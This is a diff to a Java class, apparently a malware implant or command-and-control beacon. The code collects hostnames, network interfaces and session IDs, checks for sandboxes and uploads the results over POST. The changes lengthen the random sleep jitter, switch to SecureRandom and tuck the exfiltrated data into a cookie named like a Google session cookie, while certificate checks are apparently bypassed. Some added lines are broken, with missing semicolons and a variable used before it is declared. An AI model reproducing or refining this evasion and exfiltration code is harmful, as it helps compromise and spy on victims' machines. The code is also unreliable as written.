@@ -10,7 +10,6 @@ import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Hashtable;
-import java.util.Random;
 import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 import java.util.Base64;
@@ -30,6 +29,7 @@ import java.net.UnknownHostException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
 import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -92,6 +92,7 @@ public class nCore
     {
         //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
+        nonce = sessUUID.substring(0,12).replace("-","");
         //convert to threadable once main loop has been tested
 
         //check if the program can reach out and if it's in a sandbox
@@ -237,8 +238,10 @@ public class nCore
             for (int d=0;d<output.size();d++)
             {
                 try {
-                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,4))*1000);
-                    String cReq = nComm.request(nComm.mkAuth(),"upload");
+                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
+                    Hashtable outTable = (Hashtable) output.get(d);
+                    String keyName = outTable.keySet().stream().findFirst().get().toString();
+                    String cReq = nComm.request(outTable.get(keyName).toString(),"upload");
                 }
                 catch (Exception e)
                 {
@@ -353,13 +356,14 @@ public class nCore
                 metadata.put("interfaces",nUtil.getAddress().toString());
                 metadata.put("hostname",nUtil.getHostname());
                 metadata.put("uuid",sessUUID);
+                metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
+                metadata.put("output",nUtil.xmlDocToString(metaDoc));
+                metadata.put("error","")
+
 
                 Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
 
-                outObj.put("mod",new Object(){}.getClass().getEnclosingMethod().getName());
-                outObj.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
-                outObj.put("output",nUtil.xmlDocToString(metaDoc));
-                outObj.put("error","")
+                outObj.put(new Object(){}.getClass().getEnclosingMethod().getName(),metaDoc)
 
                 nCore.output.add(outObj);
             }
@@ -380,11 +384,13 @@ public class nCore
 
     private static class utilitarian
     {
-        private int rngenerator(int rangeMin, int rangeMax)
+	
+	    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
         {
-            Random rand = new Random();
-            return (rand.nextInt((rangeMax - rangeMin) + 1) + rangeMin);
-        }
+		    SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
+		    int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
+		    return randNum;
+	    }
 
         private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
         {
@@ -566,8 +572,12 @@ public class nCore
                 connMan.setRequestMethod("POST");
                 connMan.setDoOutput(true);
                 connMan.setRequestProperty(
-                    "__Secure-3PSIDCC",
-                    new String(Base64.getEncoder().encode(cookieData.getBytes()))
+                    "Cookie",
+                    String.format(
+                        "__Secure-3PSIDCC=%s; uuid=%s",
+                        new String(Base64.getEncoder().encode(cookieData.getBytes())),
+                        sessUUID
+                    )
                 );
 
                 connMan.setHostnameVerifier(new InvalidCertificateHostVerifier());
